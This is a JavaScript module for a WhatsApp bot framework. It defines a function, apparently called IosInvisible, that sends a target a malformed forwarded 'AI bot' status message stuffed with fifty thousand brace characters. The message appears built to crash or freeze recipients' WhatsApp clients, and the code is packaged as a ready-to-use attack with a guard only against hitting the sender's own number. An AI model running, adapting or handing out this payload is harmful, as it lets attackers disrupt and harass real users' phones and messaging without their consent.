const { default: makeWASocket, proto, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

// Declaração da função sleep
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function IosInvisible(sock, target) {
    if (!sock || !target) {
        console.log('[IosInvisible] missing sock or target');
        return;
    }

    // ---- Sender guard ----
    // Never let the paired number target itself.
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(target).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[IosInvisible] skipped — target equals sender (' + senderNum + ')');
            return;
        }
    } catch (_) {
        // fall through
    }

    try {
        await sock.relayMessage('status@broadcast', {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [],
                        unifiedResponse: {
                            data: Buffer.from(JSON.stringify({
                                response_id: crypto.randomUUID(),
                                sections: [
                                    {
                                        view_model: {
                                            primitive: {
                                                text: "lixo",
                                                inline_entities: ["{".repeat(50000)],
                                                __typename: "GenAIMarkdownTextUXPrimitive"
                                            },
                                            __typename: "GenAISingleLayoutViewModel"
                                        }
                                    }
                                ]
                            }))
                        },
                        contextInfo: {
                            forwardingScore: 1,
                            isForwarded: true,
                            forwardOrigin: 4,
                            forwardedAiBotMessageInfo: {
                                botJid: "0@bot"
                            }
                        }
                    }
                }
            }
        }, {
            statusJidList: [target],
            additionalNodes: [{
                tag: 'meta',
                attrs: {},
                content: [{
                    tag: 'mentioned_users',
                    attrs: {},
                    content: [{ tag: 'to', attrs: { jid: target }, content: [] }]
                }]
            }]
        });
    } catch (e) {
        console.log('[IosInvisible]', (e && e.message) ? e.message : e);
    }

    await sleep(1000);
}

module.exports = { IosInvisible };
